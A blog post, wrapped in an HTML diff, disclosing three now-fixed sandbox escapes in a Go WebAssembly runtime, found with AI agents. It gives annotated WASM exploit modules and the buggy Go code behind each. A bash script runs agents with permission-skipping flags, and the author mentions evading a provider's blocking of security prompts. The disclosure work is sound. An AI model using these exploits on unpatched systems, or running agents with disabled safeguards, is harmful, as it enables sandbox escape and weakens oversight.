@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>James Routley | Feed</title>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="../styles.css"
+      media="screen"
+    />
+  </head>
+  <body>
+    <a href="/index.html">Back</a>
+    <a href="https://andreapivetta.com/posts/all-the-bugs-they-found.html">Original</a>
+    <h1>All the bugs they found</h1>
+    
+    <div id="readability-page-1" class="page"><div>
+        <article>
+          
+          <p>
+            <small><time datetime="2026-05-18">2026-05-18</time></small>
+          </p>
+
+          <p>
+            Last year I wrote a small WASM runtime in Go,
+            <a href="https://github.com/ziggy42/epsilon">Epsilon</a>. As far as runtimes go, this is
+            a pretty simple one: no JIT, just a pure instruction interpreter in ~11k lines of code.
+            It is also very extensively tested against the
+            <a href="https://github.com/WebAssembly/testsuite">official WASM testsuite</a>.
+          </p>
+
+          <p>
+            Epsilon is designed to be embeddable in other applications and provide a sandbox for
+            potentially untrusted code.
+          </p>
+
+          <p>How many security vulnerabilities do you think AI agents found in it?</p>
+
+          <p><strong>More than 20.</strong></p>
+
+          <p>
+            Most of these were somewhat simple DoS attacks, e.g. panics during parsing or
+            validation. Some were clear API design failures that would probably have surfaced sooner
+            with a bit more usage of the project. A few weren&#39;t exploitable on their own, but would
+            become serious if combined with a future bug elsewhere.
+          </p>
+
+          <p>
+            A handful, though, were properly interesting: sandbox escapes that let a malicious
+            <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Guides/Concepts#webassembly_key_concepts">WASM module</a>
+            break out of its isolation and reach into another module&#39;s private state. These are my
+            favorites.
+          </p>
+
+          <h2>Background</h2>
+
+          <p>
+            A single Epsilon runtime can host multiple WASM modules. In the WASM security model,
+            modules are isolated except for explicitly exported (and imported) objects. Unexported
+            functions, memories, etc., are private to the module that defined them.
+          </p>
+
+          <p>
+            WASM is a typed stack machine, but the type checking does not happen at runtime: before
+            execution, a validator walks the bytecode and verifies that at any point the values on
+            the stack have the expected type. For example, a module that tried to
+            <code>local.set</code> an <code>i32</code> into a <code>funcref</code> local would be
+            rejected before it ever started running. Epsilon then executes blindly, trusting the
+            validator&#39;s earlier checks.
+          </p>
+
+          <p>
+            Thanks to the type guarantees provided by the validator, a
+            <code>funcref</code> at runtime in Epsilon is represented as an <code>int32</code>:
+            <code>-1</code> is the null sentinel, and any non-negative value is an index into the
+            global function store, shared across all modules instantiated in the runtime. As a
+            result, the constant <code>0</code> and a <code>funcref</code> pointing to the first
+            function in the store are indistinguishable during execution. This simplifies the
+            implementation and improves performance, at the cost of delegating safety entirely to
+            the validator.
+          </p>
+
+          <p>
+            Each attacker module in the following sections runs alongside the same victim module:
+          </p>
+
+          <pre><code>(module
+  (func $secret (result i32)   ;; declares a function $secret: takes no parameters,
+                               ;; returns a 32-bit integer. Private, never exported
+    i32.const 1337             ;; pushes 1337 onto the stack; becomes the return value
+  )
+)</code></pre>
+
+          <p>
+            Since <code>$secret</code> is the first function instantiated into the runtime, it lives
+            at store index 0. The goal of each attacker module is to get the VM to call it,
+            returning <code>1337</code>, despite never being given a legitimate
+            <code>funcref</code> to it.
+          </p>
+
+          <h2>1. Zero Is Not Null</h2>
+
+          <p>The simplest of the three. Here&#39;s the attacker:</p>
+
+          <pre><code>(module
+  (type $t (func (result i32)))   ;; the call_indirect type signature
+  (table 1 funcref)               ;; a table of size 1 (essentially an array of funcrefs).
+                                  ;; Identified by its module-level index, which is 0
+                                  ;; here since it&#39;s the first (and only) table declared
+
+  (func (export &#34;exploit&#34;) (result i32)
+    (local $f funcref)            ;; declared, never assigned;
+                                  ;; per spec, ref locals default to null
+
+    i32.const 0                   ;; the slot in the table where we&#39;ll write
+                                  ;; stack: [0]
+    local.get $f                  ;; push $f&#39;s value (null)
+                                  ;; stack: [0, null]
+    table.set 0                   ;; immediate 0 picks which table to write to
+                                  ;; (tables[0]); pops two values from the stack:
+                                  ;; first the funcref (null), then the slot index.
+                                  ;; Writes tables[0][0] = null
+                                  ;; stack: []
+
+    i32.const 0                   ;; the slot in the table to fetch from next
+                                  ;; stack: [0]
+    call_indirect (type $t)       ;; pop the slot, fetch tables[0][slot] (null),
+                                  ;; and call it
+  )
+)</code></pre>
+
+          <p>
+            The <code>exploit</code> function, while perfectly valid WASM, should trap at runtime.
+            The local <code>$f</code> is uninitialized, therefore null.
+            <code>call_indirect</code> should fail.
+          </p>
+
+          <p>Except that in Epsilon, it didn&#39;t. It called <code>$secret</code> instead.</p>
+
+          <p>
+            The culprit was how locals were initialized. When a function is called, the spec
+            requires locals to be initialized to their default values: zero for numeric and vector
+            types, but null for reference types. Epsilon achieved this by zeroing all non-parameter
+            locals using Go&#39;s <code>clear()</code>:
+          </p>
+
+          <pre><code>// Clear non-parameter locals to their zero values.
+clear(locals[numParams:])</code></pre>
+
+          <p>
+            This was idiomatic and fast, but Go&#39;s <code>clear()</code> simply set the local to
+            <code>0</code>. Per our funcref representation, that&#39;s not null (<code>-1</code>): it&#39;s
+            the store index of <code>$secret</code>. When <code>exploit</code> was called, rather
+            than trapping on a null <code>call_indirect</code>, the VM called the function at store
+            index 0.
+          </p>
+
+          <p>
+            <a href="https://github.com/ziggy42/epsilon/pull/62">Fixed</a>.
+            <a href="https://gist.github.com/ziggy42/75c3fddb5cdd77fbf051e36eb2a350b8">Repro</a>.
+          </p>
+
+          <h2>2. Phantom Block Parameter</h2>
+
+          <p>This one combines two separate bugs:</p>
+
+          <pre><code>(module
+  (type $t (func (result i32)))
+  (table 1 funcref)
+
+  (func (export &#34;exploit&#34;) (result i32)
+    (local $f funcref)
+
+    ref.null func               ;; push a null funcref onto the stack
+    i32.const 0
+
+    (block (param i32)          ;; block consumes the i32 from the stack...
+      drop                      ;; ...and immediately drops it
+    )
+
+    local.set $f                ;; store top of stack into $f (the null funcref)
+    local.get $f
+    ref.is_null                 ;; is $f null?
+
+    if (result i32)
+      i32.const 42              ;; expected path: $f was null, return 42
+    else                        ;; unreachable path: $f is always null
+      i32.const 0
+      local.get $f
+      table.set 0
+      i32.const 0
+      call_indirect (type $t)
+    end
+  )
+)</code></pre>
+
+          <p>
+            In any correct WASM implementation (and indeed in the latest version of Epsilon),
+            <code>exploit</code> returns <code>42</code>, as expected. It returned <code>1337</code>
+            instead.
+          </p>
+
+          <h3>Stack Height Misalignment</h3>
+
+          <p>
+            During their execution, control-flow blocks (<code>block</code>,
+            <code>loop</code>, <code>if</code>) may consume inputs from the stack and produce
+            results on it. At the end of execution the stack must look exactly as the block&#39;s
+            signature describes: N_params consumed, N_results pushed in their place. Anything the
+            body left in between has to be discarded, so the runtime needs to know how high the
+            stack was when entering the block.
+          </p>
+
+          <p>
+            In Epsilon, that height was recorded when a new control frame was pushed onto the
+            control frame stack:
+          </p>
+
+          <pre><code>vm.pushControlFrame(frame, controlFrame{
+    stackHeight: vm.stack.size(),   // height at block entry
+    // ...
+})</code></pre>
+
+          <p>
+            But here lies the first bug: that line captures the stack height
+            <em>after</em> the block&#39;s parameters are already pushed. In WASM, parameters are
+            <em>consumed</em> by the block: they belong to the block, not to the surrounding scope.
+            So the validator and the VM now disagree by exactly N parameters about where &#34;the bottom
+            of the block&#34; is on the stack.
+          </p>
+
+          <h3>Memory Resurrection</h3>
+
+          <p>
+            When a block ends, the VM calls <code>unwind</code> to restore the stack to its
+            declared, pre-block height. <code>targetHeight</code> is the stack height recorded in
+            the <code>controlFrame</code> structure.
+          </p>
+
+          <pre><code>func (s *valueStack) unwind(targetHeight, preserveCount uint32) {
+    valuesToPreserve := s.data[s.size()-preserveCount:]
+    s.data = s.data[:targetHeight]
+    s.data = append(s.data, valuesToPreserve...)
+}</code></pre>
+
+          <p>
+            Because of the stack height misalignment bug above, <code>targetHeight</code> is too
+            high: it counts the block&#39;s parameters as if they were still on the stack. Therefore
+            <code>s.data[:targetHeight]</code> causes the slice to grow back rather than be
+            truncated. As long as <code>targetHeight &lt;= cap(s.data)</code>, Go is happy to
+            re-expose whatever was sitting in the backing array.
+          </p>
+
+          <p>
+            Parameters that the validator considered consumed are now resurrected on top of the
+            stack.
+          </p>
+
+          <h3>Bugs Collide</h3>
+
+          <p>Let&#39;s walk through the <code>exploit</code> function with both bugs in mind:</p>
+
+          <pre><code>(func (export &#34;exploit&#34;) (result i32)
+  (local $f funcref)
+
+  ref.null func        ;; stack: [null_funcref]
+  i32.const 0          ;; 0 is the index where $secret happens to sit in the
+                       ;; global function store, since it was the very first
+                       ;; function instantiated
+                       ;; stack: [null_funcref, 0]
+
+  (block (param i32)   ;; bug #1: VM records stackHeight = 2; the validator,
+                       ;; treating the i32 as consumed (per spec), records 1
+    drop               ;; pops and discards the top of the stack (the 0)
+                       ;; stack: [null_funcref]
+  )                    ;; bug #2: `end` calls unwind, which sets s.data to
+                       ;; s.data[:2], so len 1 grows back to 2, and the 0 we
+                       ;; dropped resurrects on top. The top is now an int32
+                       ;; of value 0, but the validator still thinks it&#39;s a
+                       ;; funcref
+                       ;; stack: [null_funcref, 0]
+
+  local.set $f         ;; 0 is put in $f, which should be a funcref. Since
+                       ;; Epsilon&#39;s internal representation of funcref is also
+                       ;; an int32, this works at runtime
+  local.get $f         ;; stack: [null_funcref, 0]
+  ref.is_null          ;; null is -1, so 0 isn&#39;t null; pops the funcref and
+                       ;; pushes 0 (false). The top of the stack visually
+                       ;; still looks like 0, but its type changed from
+                       ;; funcref to i32
+                       ;; stack: [null_funcref, 0 (i32 false)]
+
+  if (result i32)      ;; pops the i32 condition (0, false), so the else
+                       ;; branch fires
+                       ;; stack: [null_funcref]
+    i32.const 42       ;; not taken
+  else
+    i32.const 0        ;; the slot index for the upcoming table.set
+                       ;; stack: [null_funcref, 0]
+    local.get $f       ;; the funcref value to store (actually the int32 0)
+                       ;; stack: [null_funcref, 0, 0]
+    table.set 0        ;; pops the funcref then the slot index; both are 0,
+                       ;; so tables[0][0] now holds the integer 0 dressed as
+                       ;; a funcref
+                       ;; stack: [null_funcref]
+    i32.const 0        ;; the slot index within the table to look up
+                       ;; stack: [null_funcref, 0]
+    call_indirect (type $t)
+                       ;; pops the slot index, fetches tables[0][0] (our
+                       ;; int 0 dressed as a funcref), which points at
+                       ;; store[0] = $secret. Call it.
+  end
+)</code></pre>
+
+          <p>
+            A perfectly valid WASM module just called an unexported function from another module. By
+            choosing a different integer, it could reach any private function in Epsilon&#39;s global
+            store.
+          </p>
+
+          <p>
+            <a href="https://github.com/ziggy42/epsilon/pull/48">Fixed</a>.
+            <a href="https://gist.github.com/ziggy42/75c3fddb5cdd77fbf051e36eb2a350b8">Repro</a>.
+          </p>
+
+          <h2>3. Ghost in the Stack</h2>
+
+          <p>
+            The first two exploits relied on the validator and VM disagreeing about values on the
+            stack inside the sandbox. This one shifts category: the disagreement is between a host
+            function&#39;s <em>declared</em> signature and what it <em>actually</em> returns at runtime.
+          </p>
+
+          <pre><code>(module
+  (type $t (func (result i32)))
+  (import &#34;env&#34; &#34;leak&#34; (func $leak (result funcref)))   ;; the host must provide env.leak
+  (table 1 funcref)
+
+  (func (export &#34;exploit&#34;) (result i32)
+    i32.const 0          ;; table index
+    i32.const 0          ;; index of $secret in the global function store
+
+    call $leak           ;; declared to return a funcref; the validator thinks
+                         ;; the stack gains one new value after this call
+
+    table.set 0          ;; store the &#34;result&#34; (actually our 0) into the table
+    i32.const 0
+    call_indirect (type $t)
+    return
+  )
+)</code></pre>
+
+          <p>
+            For this exploit to land, the host needs to provide a function
+            <code>env.leak</code> whose runtime behavior diverges from its signature: one that
+            returns <em>fewer</em> results than promised.
+          </p>
+
+          <p>
+            In a correct WASM implementation, the runtime should trap on that mismatch. In Epsilon,
+            the VM blindly trusted the host&#39;s declared signature:
+          </p>
+
+          <pre><code>res := fun.hostCode(fun.module, args...)
+vm.stack.pushAll(res)</code></pre>
+
+          <p>
+            If <code>leak</code> returned an empty slice instead of the promised funcref,
+            <code>pushAll</code> did nothing. The validator believed a funcref had been pushed.
+            Instead, the stack was unchanged.
+          </p>
+
+          <p>
+            The two <code>0</code>s pushed before <code>$leak</code> were still on the stack. The VM
+            ran <code>table.set 0</code> and popped them: one as the funcref, one as the slot index.
+            <code>tables[0][0]</code> now held the integer 0. <code>call_indirect</code> fetched it
+            and happily called the function at index 0, <code>$secret</code>.
+          </p>
+
+          <p>
+            <a href="https://github.com/ziggy42/epsilon/pull/61">Fixed</a>.
+            <a href="https://gist.github.com/ziggy42/75c3fddb5cdd77fbf051e36eb2a350b8">Repro</a>.
+          </p>
+
+          <h2>Methodology</h2>
+
+          <p>
+            I used a combination of approaches to find these bugs, starting with a script similar to
+            the one described in the
+            <a href="https://youtu.be/1sd26pWhfmg?t=307">Black-hat LLMs</a>
+            talk:
+          </p>
+
+          <details>
+            <summary>Show the script</summary>
+            <pre><code>#!/bin/bash
+
+# Directory to store vulnerability reports
+VULN_DIR=&#34;vulnerabilities&#34;
+mkdir -p &#34;$VULN_DIR&#34;
+
+# List of areas to investigate
+AREAS=(
+    &#34;epsilon/parser.go&#34;
+    &#34;epsilon/validation.go&#34;
+    &#34;epsilon/vm.go&#34;
+    &#34;epsilon/memory.go&#34;
+    &#34;epsilon/imports.go&#34;
+    &#34;wasip1/wasi_resources.go&#34;
+    &#34;wasip1/wasi_poll.go&#34;
+    &#34;wasip1/wasi_unix.go&#34;
+)
+
+PROMPT_TEMPLATE=&#34;You are an expert security researcher and exploit developer.
+
+STRICT CONSTRAINT: Do NOT modify any file outside the &#39;$VULN_DIR/&#39; directory. Do not touch &#39;epsilon/&#39;, &#39;wasip1/&#39;, or any other source file. All output goes in &#39;$VULN_DIR/&#39; only.
+
+Your task is to objectively investigate the following file for security vulnerabilities: %s
+
+Explore the file and any related files, data structures, or interactions it depends on. Where relevant, check behavior against the WebAssembly 2.0 specification (https://webassembly.github.io/spec/versions/core/WebAssembly-2.0.pdf) and the WASI Preview 1 specification — a deviation from spec in security-sensitive code is itself a vulnerability. Do not flag missing features from specs beyond WebAssembly 2.0.
+
+Do not assume a vulnerability exists. If after thorough investigation you find nothing exploitable, state so clearly and stop.
+
+If you confirm a vulnerability:
+1. Create a dedicated directory: &#39;$VULN_DIR/&lt;vulnerability_name&gt;/&#39;
+2. Write &#39;README.md&#39; with: root cause, impact, and reproduction steps
+3. Write a PoC exploit: a concrete, runnable demonstration (Go test, .wasm file, or script) that proves the vulnerability is triggerable by a malicious WebAssembly module without any special host configuration&#34;
+
+# Get agent from command line, default to claude
+AGENT=${1:-claude}
+
+if [ &#34;$AGENT&#34; == &#34;claude&#34; ]; then
+    AGENT_CMD=&#34;claude --dangerously-skip-permissions&#34;
+elif [ &#34;$AGENT&#34; == &#34;gemini&#34; ]; then
+    AGENT_CMD=&#34;gemini --yolo&#34;
+elif [ &#34;$AGENT&#34; == &#34;vibe&#34; ]; then
+    AGENT_CMD=&#34;vibe --trust&#34;
+else
+    echo &#34;Usage: $0 [claude|gemini|vibe]&#34;
+    exit 1
+fi
+
+for AREA in &#34;${AREAS[@]}&#34;; do
+    echo &#34;--------------------------------------------------&#34;
+    echo &#34;Starting investigation of area: $AREA using $AGENT&#34;
+    echo &#34;--------------------------------------------------&#34;
+
+    CURRENT_PROMPT=$(printf &#34;$PROMPT_TEMPLATE&#34; &#34;$AREA&#34;)
+
+    $AGENT_CMD -p &#34;$CURRENT_PROMPT&#34;
+
+    echo &#34;Finished investigation of $AREA.&#34;
+    echo &#34;Sleeping for 10 seconds to respect rate limits...&#34;
+    sleep 10
+done</code></pre>
+          </details>
+
+          <p>
+            Then I moved to a
+            <a href="https://github.com/ziggy42/epsilon/blob/main/.agents/skills/security-audit/SKILL.md">skill</a>
+            instead, which is slightly more convenient.
+          </p>
+
+          <p>
+            I&#39;m honestly not sure which one is better as I&#39;ve used them at different times: by the
+            time I switched, the script had already found the low-hanging fruit, so the skill never
+            had a chance at those. Re-discovering the same bugs this way is left as an exercise to
+            the reader.
+          </p>
+
+          <p>To work around token limits, I also used a variety of models, mainly:</p>
+
+          <ul>
+            <li>Gemini 3 Flash</li>
+            <li>Gemini 3.1 Pro</li>
+            <li>Opus 4.7</li>
+          </ul>
+
+          <p>
+            Again, it&#39;s hard to compare their performance as they were used at different times. Most
+            of the more serious problems were discovered by Gemini 3.1 Pro, which is the main model
+            I used at the beginning.
+          </p>
+
+          <p>
+            Trying to work around Anthropic blocking security-related prompts does get pretty tiring
+            though.
+          </p>
+
+          <h2>Closing thoughts</h2>
+
+          <p>
+            Epsilon is a weekend hobby project, so I went in expecting agents to find
+            <em>something</em>. It was still astonishing to see some of these issues. Bug #2 in
+            particular is pretty cool.
+          </p>
+
+          <p>
+            Please update to version
+            <a href="https://github.com/ziggy42/epsilon/blob/main/CHANGELOG.md#010---2026-05-19">0.1.0</a>.
+          </p>
+        </article>
+      </div></div>
+  </body>
+</html>
